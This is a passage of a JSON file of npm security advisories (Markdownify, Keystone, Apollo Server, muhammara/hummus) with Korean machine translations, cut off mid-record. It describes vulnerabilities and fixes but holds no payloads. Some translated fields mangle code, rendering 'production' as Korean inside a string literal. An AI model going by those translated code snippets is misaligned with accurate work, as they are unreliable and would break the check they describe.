    "descriptionKR": "Markdownify 버전 1.4.1을 사용하면 외부 공격자가 Markdownify를 통해 악의적인 마크다운 파일을 보려고 시도하는 모든 클라이언트에서 원격으로 임의의 로컬 파일을 얻을 수 있습니다. 이는 응용 프로그램에 CSP 정책이 없거나(또는 적어도 충분히 엄격하지 않음) 마크다운 파일을 렌더링하기 전에 콘텐츠의 유효성을 제대로 검사하지 않기 때문에 가능합니다."
  },
  {
    "description": "### Impact\n`@keystone-6/core@3.0.0 || 3.0.1` users that use `NODE_ENV` in their own code (**not dependencies**) to trigger security-sensitive functionality in a production build are vulnerable to `NODE_ENV` being inlined to `\"development\"` for user code.\n\nIf your dependencies use `NODE_ENV` to trigger particular behaviours (optimisations, security or otherwise), they should still respect your environment's configured `NODE_ENV` variable and thereby be unaffected.\n\nIf you do not use `NODE_ENV` in your own code to trigger security-sensitive functionality, **you are not impacted** by this vulnerability.\nAn example of code that would be affected, might be the following:\n\n```typescript\nif (process.env.NODE_ENV !== 'production') {\n  // this code would unintentionally run in your production builds\n}\n```\n\n### Technical Description\nThe problem comes from esbuild defaulting `NODE_ENV` to `\"development\"` when a platform configuration is undefined.\nYou can read about why [`esbuild` has that behaviour in their documentation](https://esbuild.github.io/api/#platform), but the result for Keystone users is that user Typescript was compiled, and had inlined `NODE_ENV` to the constant `\"development\"`. \n\nYour application's dependencies, as found in `node_modules` (including `@keystone-6/core`), are typically not compiled as part of this process, and thus should be unaffected. Therefore any libraries that used `NODE_ENV` to trigger particular behaviours (optimisations, security or otherwise) should still respect your environment's `NODE_ENV`.\nWe have tested this assumption by verifying that `NODE_ENV=production yarn keystone start` still uses secure cookies when using `statelessSessions`.\n\nThereby, the severity of this vulnerability is dependent on what functionality users conditionally triggered, in their own code, depending on the expectation that `NODE_ENV` would be correctly configured in their application. In accordance with Common Vulnerability Scoring System `2.3.3. Assume Vulnerable Configurations`, this security advisory assumes vulnerable configurations and is thus marked as *critical*, but you should evaluate the true security impact for your application to determine a relevant score.\n\n### Patches\nThis vulnerability has been fixed in `@keystone-6/core@3.0.2`, thanks to @mmachatschek in https://github.com/keystonejs/keystone/pull/8031/.\nWe have added regression tests for this vulnerability in https://github.com/keystonejs/keystone/pull/8063.\n\n### Workarounds\nIf you cannot upgrade your `@keystone-6/core` version for any reason, your best alternative is to remove any code that uses `NODE_ENV` in a way that may reasonably impact your application security. \n\n### References\n- https://esbuild.github.io/api/#platform\n- https://github.com/keystonejs/keystone/pull/8031\n- https://github.com/keystonejs/keystone/pull/8063\n\n### For more information\nThanks to [Austin Burdine](https://github.com/acburdine) for reporting this problem as a potential security vulnerability.\n\nIf you have any questions around this security advisory, please don't hesitate to contact us at [security@keystonejs.com](mailto:security@keystonejs.com), or [open an issue on GitHub](https://github.com/keystonejs/keystone/issues/new/choose).\n\nIf you have a security flaw to report for any software in this repository, please see our [SECURITY policy](https://github.com/keystonejs/keystone/blob/main/SECURITY.md).",
    "identifiers": "GHSA : GHSA-25mx-2mxm-6343\nCVE : CVE-2022-39382",
    "severity": "CRITICAL",
    "updatedAt": "2023-02-02T05:04:04Z",
    "publishedAt": "2022-11-03T18:14:05Z",
    "references": "https://github.com/keystonejs/keystone/security/advisories/GHSA-25mx-2mxm-6343\nhttps://github.com/keystonejs/keystone/pull/8063\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39382\nhttps://github.com/keystonejs/keystone/pull/8031/\nhttps://github.com/advisories/GHSA-25mx-2mxm-6343",
    "name": "@keystone-6/core",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0, < 3.0.2",
    "identifier": "3.0.2",
    "descriptionKR": "### 영향\n`@keystone-6/core@3.0.0 || 프로덕션 빌드에서 보안에 민감한 기능을 트리거하기 위해 자신의 코드(**종속성이 아님**)에서 `NODE_ENV`를 사용하는 3.0.1` 사용자는 `NODE_ENV`가 사용자 코드의 `\"개발\"`에 인라인되는 것에 취약합니다.\n\n의존성이 'NODE_ENV'를 사용하여 특정 동작(최적화, 보안 또는 기타)을 트리거하는 경우 여전히 환경에 구성된 'NODE_ENV' 변수를 존중해야 하므로 영향을 받지 않습니다.\n\n보안에 민감한 기능을 트리거하기 위해 자체 코드에서 `NODE_ENV`를 사용하지 않는 경우 **이 취약점의 영향을 받지 않습니다**.\n영향을 받는 코드의 예는 다음과 같습니다.\n\n```타입스크립트\nif (process.env.NODE_ENV !== '생산') {\n  // 이 코드는 프로덕션 빌드에서 의도하지 않게 실행됩니다.\n}\n```\n\n### 기술적 설명\n문제는 플랫폼 구성이 정의되지 않은 경우 esbuild가 `NODE_ENV`를 `\"development\"`로 기본 설정하는 데서 발생합니다.\n[`esbuild`에 해당 동작이 있는 이유는 문서에서 확인할 수 있습니다](https://esbuild.github.io/api/#platform). 하지만 Keystone 사용자에 대한 결과는 사용자 Typescript가 컴파일되어 ` NODE_ENV`를 상수 `\"개발\"`로 변경합니다.\n\n`node_modules`(`@keystone-6/core` 포함)에 있는 애플리케이션의 종속성은 일반적으로 이 프로세스의 일부로 컴파일되지 않으므로 영향을 받지 않아야 합니다. 따라서 'NODE_ENV'를 사용하여 특정 동작(최적화, 보안 또는 기타)을 트리거하는 모든 라이브러리는 여전히 환경의 'NODE_ENV'를 존중해야 합니다.\n`NODE_ENV=production yarn keystone start`가 `statelessSessions`를 사용할 때 여전히 보안 쿠키를 사용하는지 확인하여 이 가정을 테스트했습니다.\n\n따라서 이 취약점의 심각도는 애플리케이션에서 `NODE_ENV`가 올바르게 구성될 것이라는 기대에 따라 사용자가 자신의 코드에서 조건부로 트리거한 기능에 따라 다릅니다. 공통취약점 평가체계 `2.3.3. 취약한 구성 가정', 이 보안 권고는 취약한 구성을 가정하므로 *중요*로 표시되지만 애플리케이션에 대한 실제 보안 영향을 평가하여 관련 점수를 결정해야 합니다.\n\n### 패치\n이 취약점은 https://github.com/keystonejs/keystone/pull/8031/의 @mmachatschek 덕분에 `@keystone-6/core@3.0.2`에서 수정되었습니다.\n이 취약점에 대한 회귀 테스트를 https://github.com/keystonejs/keystone/pull/8063에 추가했습니다.\n\n### 해결 방법\n어떤 이유로든 `@keystone-6/core` 버전을 업그레이드할 수 없는 경우 가장 좋은 대안은 응용 프로그램 보안에 합리적으로 영향을 미칠 수 있는 방식으로 `NODE_ENV`를 사용하는 코드를 제거하는 것입니다.\n\n### 참조\n- https://esbuild.github.io/api/#platform\n- https://github.com/keystonejs/keystone/pull/8031\n- https://github.com/keystonejs/keystone/pull/8063\n\n### 자세한 내용은\n이 문제를 잠재적인 보안 취약점으로 보고해 주신 [Austin Burdine](https://github.com/acburdine)에게 감사드립니다.\n\n이 보안 권고에 대해 질문이 있는 경우 주저하지 말고 [security@keystonejs.com](mailto:security@keystonejs.com)으로 문의하거나 [GitHub에서 문제 열기](https://github .com/keystonejs/keystone/issues/new/choose).\n\n이 리포지토리의 소프트웨어에 대해 보고할 보안 결함이 있는 경우 [보안 정책](https://github.com/keystonejs/keystone/blob/main/SECURITY.md)을 참조하세요."
  },
  {
    "description": "### Impact\nIn Apollo Server 3 and 4, the `cache-control` HTTP response header may not reflect the cache policy that should apply to an HTTP request when that HTTP request contains multiple operations using HTTP batching. This could lead to data being inappropriately cached and shared.\n\nApollo Server allows clients to send multiple operations in a single HTTP request.  The results of these operations are returned in a single HTTP response, with a single set of headers.  Apollo Client Web and Apollo Kotlin both have opt-in features to use batched requests.\n\nApollo Server has several features relating to caching. This advisory is about the ability to set the `cache-control` response header based on field- and operation-specific cache hints. (It is not about the \"response cache plugin\".) This header can be interpreted by a reverse proxy such as a CDN in front of your server, or by a browser.\n\nIn Apollo Server 2, plugins such as the cache control plugin could not control the HTTP headers of responses to batch requests. This meant that batch requests never got the `cache-control` response header.\n\nIn Apollo Server 3 and 4, plugins can set HTTP response headers. But for batched requests, plugins essentially assemble a separate set of response headers in parallel for each operation, and then the header sets are merged together. If plugins set the same header on multiple operations, one value is chosen arbitrarily.\n\nThis meant that if a client sent a batched HTTP request with two operations with different cache policies, Apollo Server 3 and 4 would return a `cache-control` header that only applies to one of the operations. If one operation is allowed to be cached and the other operation is not allowed to be cached, the full response including both results could still end up being cached in a CDN or other reverse proxy cache.\n\nNote that valid batched requests must be POST requests. (There's no defined format for sending batched requests over GET.) So in order for this incorrect `cache-control` header to have a harmful effect, a cache must allow caching POST requests. This means this bug is unlikely to cause incorrect caching in browser or mobile client caches, or in many reverse proxy/CDN caches.\n\nThis issue could lead to cache poisoning attacks. For example, if a client app regularly sends an operation that should not be cached due to its dependency on session-specific information in the same HTTP request as an operation that can be cached in a shared cache, an attacker could send its own version of the request to the server and manage to get the response to its request stored in the shared cache; other users would then see the response specific to the attacker for the first operation rather than the response for their own session. That said, we expect that in a system where this cache poisoning attack is feasible, normal operation would also run into the issue and users may have already disabled one of the features in order for their system to function properly.\n\n### Patches\n\nThis issue is patched in Apollo Server v3.11.0 and v4.1.0. The issue resolved differently in the two versions.\n\nIf you are using Apollo Server 3, upgrade the package you depend on (eg `apollo-server` or `apollo-server-express`) to v3.11.0. This will restore the Apollo Server 2 behavior where the cache control plugin *never* sets the `cache-control` HTTP response header on batched requests. (Other cache-related features, like the response cache plugin, still function.)\n\nIf you are using Apollo Server 4, upgrade `@apollo/server` to v4.1.0. This upgrade makes the response HTTP header object seen by plugins shared among all plugins processing *all operations* on a request, and makes the cache control plugin merge `cache-control` header values across operations in a request. (Note that if you set the `cache-control` response header in your own plugin, Apollo Server v4.1.0's cache control plugin will not try to overwrite the value you set.)\n\n\n### Workarounds\nAs a workaround, you can disable either the HTTP batching feature or the `cache-control` header feature.\n\nTo disable HTTP batching in Apollo Server 3 (v3.5.0 or newer), pass `allowBatchedHttpRequests: false` to `new ApolloServer`.This is the default behavior for Apollo Server 4; in AS4, just make sure you're not passing `allowBatchedHttpRequests: true`. (You cannot disable batching in versions of Apollo Server 3 older than v3.5.0.)\n\nTo disable the `cache-control` header feature, add `ApolloServerPluginCacheControl({ calculateHttpHeaders: false })` to the `plugins` list in `new ApolloServer()`.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the `apollo-server` repository](https://github.com/apollographql/apollo-server)\n* Email us at [security@apollographql.com](mailto:security@apollographql.com)\n",
    "identifiers": "GHSA : GHSA-8r69-3cvp-wxc3",
    "severity": "MODERATE",
    "updatedAt": "2023-01-08T05:03:03Z",
    "publishedAt": "2022-11-02T18:18:10Z",
    "references": "https://github.com/apollographql/apollo-server/security/advisories/GHSA-8r69-3cvp-wxc3\nhttps://github.com/apollographql/apollo-server/commit/2a2d1e3b4bbb1f2802b09004444029bd1adb9c19\nhttps://github.com/apollographql/apollo-server/commit/69be2f75d05c7044086a869d915b965ada033850\nhttps://github.com/advisories/GHSA-8r69-3cvp-wxc3",
    "name": "@apollo/server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.1.0",
    "identifier": "4.1.0",
    "descriptionKR": "### 영향\nApollo 서버 3 및 4에서 'cache-control' HTTP 응답 헤더는 해당 HTTP 요청에 HTTP 일괄 처리를 사용하는 여러 작업이 포함된 경우 HTTP 요청에 적용해야 하는 캐시 정책을 반영하지 않을 수 있습니다. 이로 인해 데이터가 부적절하게 캐시되고 공유될 수 있습니다.\n\nApollo Server는 클라이언트가 단일 HTTP 요청으로 여러 작업을 보낼 수 있도록 합니다. 이러한 작업의 결과는 단일 헤더 집합과 함께 단일 HTTP 응답으로 반환됩니다. Apollo Client Web과 Apollo Kotlin 모두 일괄 요청을 사용하는 옵트인 기능이 있습니다.\n\nApollo Server에는 캐싱과 관련된 몇 가지 기능이 있습니다. 이 권고는 필드 및 작업별 캐시 힌트를 기반으로 'cache-control' 응답 헤더를 설정하는 기능에 관한 것입니다. (\"응답 캐시 플러그인\"에 관한 것이 아닙니다.) 이 헤더는 서버 앞의 CDN과 같은 리버스 프록시 또는 브라우저에서 해석할 수 있습니다.\n\nApollo Server 2에서는 캐시 제어 플러그인과 같은 플러그인이 배치 요청에 대한 응답의 HTTP 헤더를 제어할 수 없었습니다. 즉, 배치 요청에는 `cache-control` 응답 헤더가 없습니다.\n\nApollo Server 3 및 4에서 플러그인은 HTTP 응답 헤더를 설정할 수 있습니다. 그러나 일괄 처리된 요청의 경우 플러그인은 기본적으로 각 작업에 대해 별도의 응답 헤더 세트를 병렬로 조합한 다음 헤더 세트를 함께 병합합니다. 플러그인이 여러 작업에서 동일한 헤더를 설정하면 하나의 값이 임의로 선택됩니다.\n\n즉, 클라이언트가 캐시 정책이 다른 두 작업으로 일괄 처리된 HTTP 요청을 보낸 경우 Apollo 서버 3 및 4는 작업 중 하나에만 적용되는 'cache-control' 헤더를 반환합니다. 한 작업은 캐시할 수 있고 다른 작업은 캐시할 수 없는 경우 두 결과를 포함한 전체 응답이 여전히 CDN 또는 다른 역방향 프록시 캐시에 캐시될 수 있습니다.\n\n유효한 일괄 요청은 POST 요청이어야 합니다. (GET을 통해 일괄 요청을 전송하기 위한 정의된 형식이 없습니다.) 따라서 이 잘못된 `cache-control` 헤더가 해로운 영향을 미치려면 캐시가 POST 요청 캐싱을 허용해야 합니다. 이것은 이 버그가 브라우저나 모바일 클라이언트 캐시 또는 많은 역방향 프록시/CDN 캐시에서 잘못된 캐싱을 유발할 가능성이 없음을 의미합니다.\n\n이 문제는 캐시 중독 공격으로 이어질 수 있습니다. 예를 들어 클라이언트 앱이 공유 캐시에 캐시할 수 있는 작업과 동일한 HTTP 요청의 세션별 정보에 대한 종속성으로 인해 캐시해서는 안 되는 작업을 정기적으로 보내는 경우 공격자는 자신의 버전을 보낼 수 있습니다. 서버에 요청하고 공유 캐시에 저장된 요청에 대한 응답을 관리합니다. 그러면 다른 사용자는 자신의 세션에 대한 응답이 아닌 첫 번째 작업에 대한 공격자 고유의 응답을 보게 됩니다. 즉, 이 캐시 포이즈닝 공격이 가능한 시스템에서 정상 작동도 문제에 부딪힐 수 있으며 사용자는 시스템이 제대로 작동하기 위해 이미 기능 중 하나를 비활성화했을 수 있습니다.\n\n### 패치\n\n이 문제는 Apollo Server v3.11.0 및 v4.1.0에서 패치되었습니다. 이 문제는 두 버전에서 다르게 해결되었습니다.\n\nApollo Server 3를 사용하는 경우 의존하는 패키지(예: `apollo-server` 또는 `apollo-server-express`)를 v3.11.0으로 업그레이드하십시오. 이렇게 하면 캐시 제어 플러그인 *never*가 일괄 요청에서 `cache-control` HTTP 응답 헤더를 설정하는 Apollo Server 2 동작이 복원됩니다. (응답 캐시 플러그인과 같은 다른 캐시 관련 기능은 계속 작동합니다.)\n\nApollo Server 4를 사용하는 경우 `@apollo/server`를 v4.1.0으로 업그레이드하십시오. 이 업그레이드는 요청에 대한 *모든 작업*을 처리하는 모든 플러그인 간에 공유되는 플러그인이 볼 수 있는 응답 HTTP 헤더 개체를 만들고 캐시 제어 플러그인이 요청의 작업 간에 'cache-control' 헤더 값을 병합하도록 합니다. (자신의 플러그인에서 `cache-control` 응답 헤더를 설정하면 Apollo Server v4.1.0의 캐시 제어 플러그인은 설정한 값을 덮어쓰지 않습니다.)\n\n\n### 해결 방법\n해결 방법으로 HTTP 일괄 처리 기능이나 `cache-control` 헤더 기능을 비활성화할 수 있습니다.\n\nApollo Server 3(v3.5.0 이상)에서 HTTP 일괄 처리를 비활성화하려면 `allowBatchedHttpRequests: false`를 `new ApolloServer`로 전달합니다. 이것이 Apollo Server 4의 기본 동작입니다. AS4에서는 `allowBatchedHttpRequests: true`를 전달하지 않는지 확인하세요. (v3.5.0 이전의 Apollo Server 3 버전에서는 일괄 처리를 비활성화할 수 없습니다.)\n\n`cache-control` 헤더 기능을 비활성화하려면 `new ApolloServer()`의 `plugins` 목록에 `ApolloServerPluginCacheControl({calculateHttpHeaders: false })`을 추가합니다.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [`apollo-server` 저장소](https://github.com/apollographql/apollo-server)에서 이슈 열기\n* [security@apollographql.com](mailto:security@apollographql.com)으로 이메일을 보내주세요."
  },
  {
    "description": "### Impact\nIn Apollo Server 3 and 4, the `cache-control` HTTP response header may not reflect the cache policy that should apply to an HTTP request when that HTTP request contains multiple operations using HTTP batching. This could lead to data being inappropriately cached and shared.\n\nApollo Server allows clients to send multiple operations in a single HTTP request.  The results of these operations are returned in a single HTTP response, with a single set of headers.  Apollo Client Web and Apollo Kotlin both have opt-in features to use batched requests.\n\nApollo Server has several features relating to caching. This advisory is about the ability to set the `cache-control` response header based on field- and operation-specific cache hints. (It is not about the \"response cache plugin\".) This header can be interpreted by a reverse proxy such as a CDN in front of your server, or by a browser.\n\nIn Apollo Server 2, plugins such as the cache control plugin could not control the HTTP headers of responses to batch requests. This meant that batch requests never got the `cache-control` response header.\n\nIn Apollo Server 3 and 4, plugins can set HTTP response headers. But for batched requests, plugins essentially assemble a separate set of response headers in parallel for each operation, and then the header sets are merged together. If plugins set the same header on multiple operations, one value is chosen arbitrarily.\n\nThis meant that if a client sent a batched HTTP request with two operations with different cache policies, Apollo Server 3 and 4 would return a `cache-control` header that only applies to one of the operations. If one operation is allowed to be cached and the other operation is not allowed to be cached, the full response including both results could still end up being cached in a CDN or other reverse proxy cache.\n\nNote that valid batched requests must be POST requests. (There's no defined format for sending batched requests over GET.) So in order for this incorrect `cache-control` header to have a harmful effect, a cache must allow caching POST requests. This means this bug is unlikely to cause incorrect caching in browser or mobile client caches, or in many reverse proxy/CDN caches.\n\nThis issue could lead to cache poisoning attacks. For example, if a client app regularly sends an operation that should not be cached due to its dependency on session-specific information in the same HTTP request as an operation that can be cached in a shared cache, an attacker could send its own version of the request to the server and manage to get the response to its request stored in the shared cache; other users would then see the response specific to the attacker for the first operation rather than the response for their own session. That said, we expect that in a system where this cache poisoning attack is feasible, normal operation would also run into the issue and users may have already disabled one of the features in order for their system to function properly.\n\n### Patches\n\nThis issue is patched in Apollo Server v3.11.0 and v4.1.0. The issue resolved differently in the two versions.\n\nIf you are using Apollo Server 3, upgrade the package you depend on (eg `apollo-server` or `apollo-server-express`) to v3.11.0. This will restore the Apollo Server 2 behavior where the cache control plugin *never* sets the `cache-control` HTTP response header on batched requests. (Other cache-related features, like the response cache plugin, still function.)\n\nIf you are using Apollo Server 4, upgrade `@apollo/server` to v4.1.0. This upgrade makes the response HTTP header object seen by plugins shared among all plugins processing *all operations* on a request, and makes the cache control plugin merge `cache-control` header values across operations in a request. (Note that if you set the `cache-control` response header in your own plugin, Apollo Server v4.1.0's cache control plugin will not try to overwrite the value you set.)\n\n\n### Workarounds\nAs a workaround, you can disable either the HTTP batching feature or the `cache-control` header feature.\n\nTo disable HTTP batching in Apollo Server 3 (v3.5.0 or newer), pass `allowBatchedHttpRequests: false` to `new ApolloServer`.This is the default behavior for Apollo Server 4; in AS4, just make sure you're not passing `allowBatchedHttpRequests: true`. (You cannot disable batching in versions of Apollo Server 3 older than v3.5.0.)\n\nTo disable the `cache-control` header feature, add `ApolloServerPluginCacheControl({ calculateHttpHeaders: false })` to the `plugins` list in `new ApolloServer()`.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the `apollo-server` repository](https://github.com/apollographql/apollo-server)\n* Email us at [security@apollographql.com](mailto:security@apollographql.com)\n",
    "identifiers": "GHSA : GHSA-8r69-3cvp-wxc3",
    "severity": "MODERATE",
    "updatedAt": "2023-01-08T05:03:03Z",
    "publishedAt": "2022-11-02T18:18:10Z",
    "references": "https://github.com/apollographql/apollo-server/security/advisories/GHSA-8r69-3cvp-wxc3\nhttps://github.com/apollographql/apollo-server/commit/2a2d1e3b4bbb1f2802b09004444029bd1adb9c19\nhttps://github.com/apollographql/apollo-server/commit/69be2f75d05c7044086a869d915b965ada033850\nhttps://github.com/advisories/GHSA-8r69-3cvp-wxc3",
    "name": "apollo-server-core",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0, < 3.11.0",
    "identifier": "3.11.0",
    "descriptionKR": "### 영향\nApollo 서버 3 및 4에서 'cache-control' HTTP 응답 헤더는 해당 HTTP 요청에 HTTP 일괄 처리를 사용하는 여러 작업이 포함된 경우 HTTP 요청에 적용해야 하는 캐시 정책을 반영하지 않을 수 있습니다. 이로 인해 데이터가 부적절하게 캐시되고 공유될 수 있습니다.\n\nApollo Server는 클라이언트가 단일 HTTP 요청으로 여러 작업을 보낼 수 있도록 합니다. 이러한 작업의 결과는 단일 헤더 집합과 함께 단일 HTTP 응답으로 반환됩니다. Apollo Client Web과 Apollo Kotlin 모두 일괄 요청을 사용하는 옵트인 기능이 있습니다.\n\nApollo Server에는 캐싱과 관련된 몇 가지 기능이 있습니다. 이 권고는 필드 및 작업별 캐시 힌트를 기반으로 'cache-control' 응답 헤더를 설정하는 기능에 관한 것입니다. (\"응답 캐시 플러그인\"에 관한 것이 아닙니다.) 이 헤더는 서버 앞의 CDN과 같은 리버스 프록시 또는 브라우저에서 해석할 수 있습니다.\n\nApollo Server 2에서는 캐시 제어 플러그인과 같은 플러그인이 배치 요청에 대한 응답의 HTTP 헤더를 제어할 수 없었습니다. 즉, 배치 요청에는 `cache-control` 응답 헤더가 없습니다.\n\nApollo Server 3 및 4에서 플러그인은 HTTP 응답 헤더를 설정할 수 있습니다. 그러나 일괄 처리된 요청의 경우 플러그인은 기본적으로 각 작업에 대해 별도의 응답 헤더 세트를 병렬로 조합한 다음 헤더 세트를 함께 병합합니다. 플러그인이 여러 작업에서 동일한 헤더를 설정하면 하나의 값이 임의로 선택됩니다.\n\n즉, 클라이언트가 캐시 정책이 다른 두 작업으로 일괄 처리된 HTTP 요청을 보낸 경우 Apollo 서버 3 및 4는 작업 중 하나에만 적용되는 'cache-control' 헤더를 반환합니다. 한 작업은 캐시할 수 있고 다른 작업은 캐시할 수 없는 경우 두 결과를 포함한 전체 응답이 여전히 CDN 또는 다른 역방향 프록시 캐시에 캐시될 수 있습니다.\n\n유효한 일괄 요청은 POST 요청이어야 합니다. (GET을 통해 일괄 요청을 전송하기 위한 정의된 형식이 없습니다.) 따라서 이 잘못된 `cache-control` 헤더가 해로운 영향을 미치려면 캐시가 POST 요청 캐싱을 허용해야 합니다. 이것은 이 버그가 브라우저나 모바일 클라이언트 캐시 또는 많은 역방향 프록시/CDN 캐시에서 잘못된 캐싱을 유발할 가능성이 없음을 의미합니다.\n\n이 문제는 캐시 중독 공격으로 이어질 수 있습니다. 예를 들어 클라이언트 앱이 공유 캐시에 캐시할 수 있는 작업과 동일한 HTTP 요청의 세션별 정보에 대한 종속성으로 인해 캐시해서는 안 되는 작업을 정기적으로 보내는 경우 공격자는 자신의 버전을 보낼 수 있습니다. 서버에 요청하고 공유 캐시에 저장된 요청에 대한 응답을 관리합니다. 그러면 다른 사용자는 자신의 세션에 대한 응답이 아닌 첫 번째 작업에 대한 공격자 고유의 응답을 보게 됩니다. 즉, 이 캐시 포이즈닝 공격이 가능한 시스템에서 정상 작동도 문제에 부딪힐 수 있으며 사용자는 시스템이 제대로 작동하기 위해 이미 기능 중 하나를 비활성화했을 수 있습니다.\n\n### 패치\n\n이 문제는 Apollo Server v3.11.0 및 v4.1.0에서 패치되었습니다. 이 문제는 두 버전에서 다르게 해결되었습니다.\n\nApollo Server 3를 사용하는 경우 의존하는 패키지(예: `apollo-server` 또는 `apollo-server-express`)를 v3.11.0으로 업그레이드하십시오. 이렇게 하면 캐시 제어 플러그인 *never*가 일괄 요청에서 `cache-control` HTTP 응답 헤더를 설정하는 Apollo Server 2 동작이 복원됩니다. (응답 캐시 플러그인과 같은 다른 캐시 관련 기능은 계속 작동합니다.)\n\nApollo Server 4를 사용하는 경우 `@apollo/server`를 v4.1.0으로 업그레이드하십시오. 이 업그레이드는 요청에 대한 *모든 작업*을 처리하는 모든 플러그인 간에 공유되는 플러그인이 볼 수 있는 응답 HTTP 헤더 개체를 만들고 캐시 제어 플러그인이 요청의 작업 간에 'cache-control' 헤더 값을 병합하도록 합니다. (자신의 플러그인에서 `cache-control` 응답 헤더를 설정하면 Apollo Server v4.1.0의 캐시 제어 플러그인은 설정한 값을 덮어쓰지 않습니다.)\n\n\n### 해결 방법\n해결 방법으로 HTTP 일괄 처리 기능이나 `cache-control` 헤더 기능을 비활성화할 수 있습니다.\n\nApollo Server 3(v3.5.0 이상)에서 HTTP 일괄 처리를 비활성화하려면 `allowBatchedHttpRequests: false`를 `new ApolloServer`로 전달합니다. 이것이 Apollo Server 4의 기본 동작입니다. AS4에서는 `allowBatchedHttpRequests: true`를 전달하지 않는지 확인하십시오. (v3.5.0 이전의 Apollo Server 3 버전에서는 일괄 처리를 비활성화할 수 없습니다.)\n\n`cache-control` 헤더 기능을 비활성화하려면 `new ApolloServer()`의 `plugins` 목록에 `ApolloServerPluginCacheControl({calculateHttpHeaders: false })`을 추가합니다.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [`apollo-server` 저장소](https://github.com/apollographql/apollo-server)에서 이슈 열기\n* [security@apollographql.com](mailto:security@apollographql.com)으로 이메일을 보내주세요."
  },
  {
    "description": "### Impact\nThe package muhammara before 2.6.0; all versions of package hummus are vulnerable to Denial of Service (DoS) when supplied with a maliciously crafted PDF file to be appended to another.\n\n### Patches\nIt has been patched in 2.6.0 for muhammara and not at all for hummus\n\n### Workarounds\nDo not process files from untrusted sources\n\n### References\nPR: https://github.com/julianhille/MuhammaraJS/pull/194\nIssue: https://github.com/julianhille/MuhammaraJS/issues/191\nIssue in hummus: https://github.com/galkahana/HummusJS/issues/293\n\n### Outline differences to https://nvd.nist.gov/vuln/detail/CVE-2022-25892\n\nThe difference is one is in [src/deps/PDFWriter/PDFParser.cpp](https://github.com/julianhille/MuhammaraJS/commit/1890fb555eaf171db79b73fdc3ea543bbd63c002#diff-09ac2c64aeab42b14b2ae7b11a5648314286986f8c8444a5b3739ba7203b1e9b) and the other is [PDFDocumentHandler.cpp](https://github.com/julianhille/MuhammaraJS/pull/194/files#diff-38d338ea4c047fd7dd9a05b5ffe7c964f0fa7e79aff4c307ccee7596457b1ef2) both is a null pointer but for different cases\nThese are totally diffent issues, one is in reading a pdf the other is in appendending a maliciously crafted one. The function calls are different the versions in which they are solved are diffent. ",
    "identifiers": "GHSA : GHSA-rcrx-fpjp-mfrw\nCVE : CVE-2022-39381",
    "severity": "HIGH",
    "updatedAt": "2023-02-02T05:04:21Z",
    "publishedAt": "2022-11-02T18:10:47Z",
    "references": "https://github.com/julianhille/MuhammaraJS/security/advisories/GHSA-rcrx-fpjp-mfrw\nhttps://github.com/galkahana/HummusJS/issues/293\nhttps://github.com/julianhille/MuhammaraJS/issues/191\nhttps://github.com/julianhille/MuhammaraJS/pull/194\nhttps://github.com/galkahana/HummusJS/commit/a9bf2520ab5abb69f9328906e406fbebfb36159a\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39381\nhttps://github.com/advisories/GHSA-rcrx-fpjp-mfrw",
    "name": "hummus",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.0.111",
    "identifier": "1.0.111",
    "descriptionKR": "### 영향\n2.6.0 이전의 패키지 muhammara; 패키지 hummus의 모든 버전은 악의적으로 제작된 PDF 파일과 함께 제공되어 다른 파일에 추가될 경우 서비스 거부(DoS)에 취약합니다.\n\n### 패치\n2.6.0에서 muhammara에 대해 패치되었으며 hummus에 대해서는 전혀 패치되지 않았습니다.\n\n### 해결 방법\n신뢰할 수 없는 소스의 파일을 처리하지 마십시오\n\n### 참조\n홍보: https://github.com/julianhille/MuhammaraJS/pull/194\n문제: https://github.com/julianhille/MuhammaraJS/issues/191\nhummus의 문제: https://github.com/galkahana/HummusJS/issues/293\n\n### https://nvd.nist.gov/vuln/detail/CVE-2022-25892의 차이점 개요\n\n차이점은 [src/deps/PDFWriter/PDFParser.cpp](https://github.com/julianhille/MuhammaraJS/commit/1890fb555eaf171db79b73fdc3ea543bbd63c002#diff-09ac2c64aeab42b14b2ae7b11a5648314286 986f8c8444a5b3739ba7203b1e9b)이고 다른 하나는 [PDFDocumentHandler.cpp](https: //github.com/julianhille/MuhammaraJS/pull/194/files#diff-38d338ea4c047fd7dd9a05b5ffe7c964f0fa7e79aff4c307ccee7596457b1ef2) 둘 다 널 포인터이지만 다른 경우\n이들은 완전히 다른 문제입니다. 하나는 PDF를 읽는 것이고 다른 하나는 악의적으로 제작된 것을 추가하는 것입니다. 함수 호출은 해결되는 버전이 다릅니다."
  },
  {
    "description": "### Impact\nThe package muhammara before 2.6.0; all versions of package hummus are vulnerable to Denial of Service (DoS) when supplied with a maliciously crafted PDF file to be appended to another.\n\n### Patches\nIt has been patched in 2.6.0 for muhammara and not at all for hummus\n\n### Workarounds\nDo not process files from untrusted sources\n\n### References\nPR: https://github.com/julianhille/MuhammaraJS/pull/194\nIssue: https://github.com/julianhille/MuhammaraJS/issues/191\nIssue in hummus: https://github.com/galkahana/HummusJS/issues/293\n\n### Outline differences to https://nvd.nist.gov/vuln/detail/CVE-2022-25892\n\nThe difference is one is in [src/deps/PDFWriter/PDFParser.cpp](https://github.com/julianhille/MuhammaraJS/commit/1890fb555eaf171db79b73fdc3ea543bbd63c002#diff-09ac2c64aeab42b14b2ae7b11a5648314286986f8c8444a5b3739ba7203b1e9b) and the other is [PDFDocumentHandler.cpp](https://github.com/julianhille/MuhammaraJS/pull/194/files#diff-38d338ea4c047fd7dd9a05b5ffe7c964f0fa7e79aff4c307ccee7596457b1ef2) both is a null pointer but for different cases\nThese are totally diffent issues, one is in reading a pdf the other is in appendending a maliciously crafted one. The function calls are different the versions in which they are solved are diffent. ",
    "identifiers": "GHSA : GHSA-rcrx-fpjp-mfrw\nCVE : CVE-2022-39381",
    "severity": "HIGH",
    "updatedAt": "2023-02-02T05:04:21Z",
    "publishedAt": "2022-11-02T18:10:47Z",
